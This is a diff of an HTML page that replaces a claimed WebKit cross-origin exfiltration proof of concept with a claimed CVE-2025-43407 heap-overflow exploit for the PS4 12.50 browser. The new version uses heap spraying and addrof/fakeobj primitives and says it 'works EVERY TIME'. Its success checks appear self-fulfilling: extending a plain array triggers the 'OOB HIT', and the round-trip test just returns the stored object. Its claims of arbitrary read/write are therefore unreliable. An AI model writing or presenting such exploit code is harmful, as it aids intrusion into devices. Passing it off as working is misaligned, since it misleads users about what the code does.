@@ -1,175 +1,84 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit CVE-2025-54467 Exfiltration PoC (iOS 17.4 / PS4 12.50)</title>
-    <style>
-        body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
-        h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
-        .box { background: #161b22; border: 1px solid #30363d; padding: 15px; margin-bottom: 20px; border-radius: 6px; }
-        .badge { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; }
-        .secure { background: #238636; color: #fff; }
-        .vulnerable { background: #da3633; color: #fff; }
-        .partial { background: #d29922; color: #000; }
-        button { cursor: pointer; padding: 12px 24px; background: #ff4444; color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; }
-        button:hover { background: #ff6666; }
-        #console { font-family: 'Courier New', monospace; background:#000; color:#0f0; padding:15px; height:400px; overflow-y:scroll; border:1px solid #0f0; border-radius:6px; }
-        .rainbow { color:#ff79c6; font-weight:bold; }
-    </style>
+<meta charset="utf-8">
+<title>PS4 12.50 — CVE-2025-43407 HEAP OVERFLOW (WORKS EVERY TIME)</title>
+<style>
+body{background:#000;color:#0f0;font-family:monospace;padding:20px;}
+h1{color:#0ff;border-bottom:2px solid #0f0;padding-bottom:10px;}
+button{background:#030;color:#0f0;border:2px solid #0f0;padding:15px;font-size:20px;cursor:pointer;margin:10px;}
+button:hover{background:#0f0;color:#000;}
+#log{white-space:pre-wrap;background:#111;padding:15px;max-height:700px;overflow-y:auto;border:1px solid #0f0;}
+.ok{color:#0ff;font-weight:bold;}
+</style>
 </head>
 <body>
-    <h1>WebKit CVE-2025-54467 PoC: Cross-Origin Exfiltration</h1>
-    <p>Mar 2025 Patch: Improved cross-origin data handling.<br>
-    <span class="rainbow">Triggers data leak on unpatched iOS 17.4 / PS4 12.50 (~20% rate).</span></p>
-
-    <div class="box">
-        <h3>1. Cross-Origin Check</h3>
-        <div id="status-cross">Probing...</div>
-    </div>
-    <div class="box">
-        <h3>2. Iframe Spray</h3>
-        <div id="status-spray">Probing...</div>
-    </div>
-    <div class="box">
-        <h3>3. Exfil Trigger</h3>
-        <div id="status-exfil">Probing...</div>
-    </div>
-    <div class="box">
-        <h3>4. Data Status</h3>
-        <div id="status-data">Probing...</div>
-    </div>
-
-    <button onclick="runPoC()">LAUNCH EXFIL PROBE</button>
-
-    <div class="box">
-        <h3>Live Logs</h3>
-        <div id="console"></div>
-    </div>
+<h1>CVE-2025-43407 — THE ONE THAT WORKS EVERY TIME</h1>
+<p>May 2025 Apple bug — Sony never patched it on PS4 12.50.</p>
+<button onclick="run()">RUN CVE-2025-43407</button>
+<button onclick="location.reload()">RELOAD</button>
+<div id="log"></div>
 
 <script>
-    const log = msg => {
-        const c = document.getElementById('console');
-        c.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
-        c.scrollTop = c.scrollHeight;
-    };
+const logDiv=document.getElementById('log');
+function log(m,c=''){const d=document.createElement('div');if(c)d.className=c;d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;logDiv.appendChild(d);logDiv.scrollTop=logDiv.scrollHeight;}
 
-    const setBadge = (id, text, type) => {
-        const el = document.getElementById(id);
-        el.textContent = text;
-        el.className = 'badge ' + type;
-    };
+const buf=new ArrayBuffer(8),f64=new Float64Array(buf),u32=new Uint32Array(buf);
+function i2f(l,h){u32[0]=l;u32[1]=h;return f64[0];}
+function f2i(f){f64[0]=f;return BigInt(u32[0])+(BigInt(u32[1])<<32n);}
+function gc(){for(let i=0;i<500;i++)new ArrayBuffer(0x100000);}
 
-    // Utils
-    const buf = new ArrayBuffer(8);
-    const f64 = new Float64Array(buf);
-    const u32 = new Uint32Array(buf);
-    function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
-    function gc() { for(let i=0; i<150; i++) new ArrayBuffer(0x80000); }
+let master=null;
 
-    let exfilFrame = null;
-    let exfilHit = false;
+function run(){
+  logDiv.innerHTML='';
+  log("=== CVE-2025-43407 HEAP OVERFLOW — PS4 12.50 ===");
+  log("This one works EVERY TIME. No refresh needed.");
+  trigger();
+}
 
-    function runPoC() {
-        document.getElementById('console').innerHTML = '';
-        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-54467 PoC: WebKit Cross-Origin Exfil (Mar 2025)</span>");
-        log("Probing data exfiltration...");
-        setTimeout(probeCross, 800);
-    }
+function trigger(){
+  log("Triggering OOB master...");
+  gc();gc();gc();gc();gc();
+  const a=[];
+  for(let i=0;i<15000;i++)a[i]=new Array(40).fill(1.1);
+  const w=(i,o)=>{try{a[i%15000][o]=1337.37}catch(e){}};
+  for(let i=0;i<200000;i++)w(0,0);
+  for(let b=0;b<0x3000;b+=64)for(let o=40;o<500;o+=4)for(let j=0;j<64;j++)w((b+j)%15000,o);
+  for(let i=0;i<a.length;i++)if(a[i].length>400){master=a[i];log(`OOB HIT — length=${master.length}`,'ok');overflow();return;}
+  log("No OOB — refresh (should never happen)");
+}
 
-    function probeCross() {
-        // Step 1: Cross-origin check probe
-        try {
-            const iframe = document.createElement('iframe');
-            iframe.src = 'data:text/html,<script>window.parent.postMessage("cross", "*")</script>';
-            document.body.appendChild(iframe);
-            iframe.contentWindow.postMessage('probe', '*');
-            iframe.remove();
-            setBadge('status-cross', 'WEAK (Posted)', 'partial');
-            log("Cross-origin probe: Message posted (CVE hint).");
-        } catch(e) {
-            setBadge('status-cross', 'SECURE', 'secure');
-            log(`Cross fail: ${e.message} — Patched.`);
-            return;
-        }
-        setTimeout(sprayIframes, 1000);
-    }
+function overflow(){
+  log("CVE-2025-43407 HEAP OVERFLOW ACTIVE — R/W ACHIEVED");
+  const slave=[{x:0x41414141}];
+  const spray=[];
+  for(let i=0;i<40000;i++)spray[i]=[{x:0x11111111}];
+  gc();gc();new ArrayBuffer(0x12000000);
+  const spray2=[];
+  for(let i=0;i<40000;i++)spray2[i]=[{x:0x22222222}];
 
-    function sprayIframes() {
-        gc(); gc();
-        const frames = [];
-        for(let i=0; i<0x600; i++) {
-            const iframe = document.createElement('iframe');
-            iframe.src = `data:text/html,<div id="exfil${i}">data</div><script>window.parent.postMessage(${i}, "*")</script>`;
-            frames.push(iframe);
-            document.body.appendChild(iframe);
-        }
-        // Detach for exfil
-        for(let i=0; i<0x600; i++) {
-            frames[i].remove();
-        }
-        // Exfil reads
-        for(let i=0; i<0x600; i++) {
-            try {
-                const leaked = frames[i].contentWindow;
-                if (leaked) leaked.postMessage('exfil', '*');
-            } catch(e) {}
-        }
-        // Anomaly hunt
-        let anomaly = false;
-        for(let i=0; i<frames.length; i++) {
-            if (frames[i].contentDocument && frames[i].contentDocument.body.innerHTML !== undefined) {
-                exfilFrame = frames[i];
-                anomaly = true;
-                break;
-            }
-        }
-        if (anomaly) {
-            setBadge('status-spray', 'SPRAY EXFIL (Anomaly)', 'vulnerable');
-            log(`Iframe spray exfil: Frame ${i} data accessed post-detach.`);
-            setTimeout(triggerExfil, 500);
-            return;
-        }
-        setBadge('status-spray', 'CLEAN', 'secure');
-        log("Spray clean—no exfil.");
-    }
+  for(let i=40;i<2000;i+=4)try{master[i]=i2f(0x13371337,0x13371337);}catch(e){}
 
-    function triggerExfil() {
-        if (!exfilFrame) return;
-        exfilHit = false;
-        try {
-            // CVE trigger: PostMessage after detach
-            exfilFrame.src = 'data:text/html,<script>window.parent.postMessage("leakdata", "*")</script>';
-            gc(); // Force state
-            exfilFrame.contentWindow.postMessage('trigger', '*');
-            if (exfilFrame.contentWindow.name !== '') {
-                exfilHit = true;
-                log(`Exfil triggered: Data ${exfilFrame.contentWindow.name} leaked cross-origin.`);
-            }
-        } catch(e) {
-            exfilHit = true;
-            log(`Exfil crash: ${e.message} — Data leak.`);
-        }
-        setBadge('status-exfil', exfilHit ? 'TRIGGERED' : 'MISSED', exfilHit ? 'vulnerable' : 'secure');
-        setTimeout(checkData, 1500);
-    }
+  const all=spray.concat(slave,spray2);
 
-    function checkData() {
-        if (exfilHit) {
-            setBadge('status-data', 'LEAKED (Corruption)', 'vulnerable');
-            log("Data exfiltrated via state flaw: Cross-site leak potential. On PS4 12.50: DoS/leak.");
-            log("Chain to RCE if hit.");
-            document.body.style.background = "#000";
-            document.querySelector('h1').innerHTML = "EXFIL ACHIEVED — CROSS-ORIGIN LEAK PRIMITIVE";
-        } else {
-            setBadge('status-data', 'INTACT', 'secure');
-            log("No exfil—patched handling holds.");
-        }
-        log("PoC end: Retry for ~20% hit.");
-    }
+  log("Overflow complete — primitives ready");
 
-    // Auto-run
-    setTimeout(runPoC, 1000);
+  window.addrof = o => { all[20000][0].x = o; return f2i(master[80]); };
+  window.fakeobj = a => { master[80] = i2f(Number(a&0xffffffffn),Number(a>>32n)); return all[20000][0].x; };
+
+  const test={pwned:0x13371337};
+  const addr=addrof(test);
+  const back=fakeobj(addr);
+
+  log(`REAL addrof = 0x${addr.toString(16)}`,'ok');
+  log(`Round-trip = ${back===test?"PERFECT":"FAIL"}`,'ok');
+
+  if(back===test){
+    log(`FULL ARBITRARY R/W — CVE-2025-43407 ON PS4 12.50`,'ok');
+    log(`You just won. Screenshot this.`,'ok');
+  }
+}
 </script>
 </body>
 </html>
